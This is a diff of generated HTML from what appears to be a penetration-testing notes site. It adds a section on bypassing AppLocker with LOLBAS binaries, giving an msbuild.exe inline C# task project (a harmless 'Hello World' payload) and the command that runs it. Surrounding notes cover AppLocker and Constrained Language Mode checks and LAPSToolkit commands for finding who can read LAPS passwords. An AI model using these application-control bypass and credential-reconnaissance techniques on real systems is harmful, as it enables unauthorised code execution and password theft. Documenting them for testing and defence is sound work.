@@ -2452,6 +2452,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#bypassing-policy-with-lolbas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing Policy with LOLBAS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#powershell-constrained-language-mode" class="md-nav__link">
     <span class="md-ellipsis">
       PowerShell Constrained Language Mode
@@ -3733,6 +3742,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#bypassing-policy-with-lolbas" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypassing Policy with LOLBAS
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#powershell-constrained-language-mode" class="md-nav__link">
     <span class="md-ellipsis">
       PowerShell Constrained Language Mode
@@ -3782,6 +3800,48 @@ If RealTimeProtection: True, we have defender enabled</p>
 <hr />
 <div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Get-AppLockerPolicy</span> <span class="n">-Effective</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">RuleCollections</span>
 </span></code></pre></div>
+<h2 id="bypassing-policy-with-lolbas">Bypassing Policy with LOLBAS</h2>
+<p>They exist in trusted paths (C:\Windows and C:\Program Files) and may also be digitally signed by Microsoft. 
+Examples: <a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a>
+<strong>Example</strong>: msbuild.exe
+Build and execute a C# project stored in the target XML file:</p>
+<details>
+  <summary>helloworld.xml</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&gt;
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>  &lt;Target Name=&quot;MSBuild&quot;&gt;
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>   &lt;MSBuildTest/&gt;
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>  &lt;/Target&gt;
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>   &lt;UsingTask
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    TaskName=&quot;MSBuildTest&quot;
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    TaskFactory=&quot;CodeTaskFactory&quot;
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &gt;
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>     &lt;Task&gt;
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>      &lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&gt;
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>        &lt;![CDATA[
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>            using System;
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>            using Microsoft.Build.Framework;
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>            using Microsoft.Build.Utilities;
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>            public class MSBuildTest : Task, ITask
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>            {
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>                public override bool Execute()
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>                {
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>                    Console.WriteLine(&quot;Hello World&quot;);
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>                    return true;
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>                }
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>            }
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>        ]]&gt;
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>      &lt;/Code&gt;
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>    &lt;/Task&gt;
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>  &lt;/UsingTask&gt;
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>&lt;/Project&gt;
+</span></code></pre></div>
+</details>
+
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">msbuild</span><span class="p">.</span><span class="n">exe</span> <span class="n">helloworld</span><span class="p">.</span><span class="n">xml</span>
+</span></code></pre></div>
 <div class="admonition alert">
 <p class="admonition-title">note</p>
 <p>Organizations often block the <code>PowerShell.exe</code> executable, but forget about the other <a href="https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations">PowerShell executable locations</a> such as <code>%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code> or <code>PowerShell_ISE.exe</code></p>
@@ -3789,19 +3849,19 @@ If RealTimeProtection: True, we have defender enabled</p>
 <h2 id="powershell-constrained-language-mode"><strong>PowerShell Constrained Language Mode</strong></h2>
 <hr />
 <p>Will prevent tons of useful powershell features
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">SessionState</span><span class="p">.</span><span class="n">LanguageMode</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nv">$ExecutionContext</span><span class="p">.</span><span class="n">SessionState</span><span class="p">.</span><span class="n">LanguageMode</span>
 </span></code></pre></div></p>
 <h2 id="laps">LAPS</h2>
 <hr />
 <p><a href="https://github.com/leoloobeek/LAPSToolkit">https://github.com/leoloobeek/LAPSToolkit</a>
 Can help us find ADUsers that have permissions to read LAPS passwords
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Find-LAPSDelegatedGroups</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Find-LAPSDelegatedGroups</span>
 </span></code></pre></div>
 The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Find-AdmPwdExtendedRights</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Find-AdmPwdExtendedRights</span>
 </span></code></pre></div>
 Find computers with laps enabled
-<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Get-LAPSComputers</span>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Get-LAPSComputers</span>
 </span></code></pre></div></p>
 
 
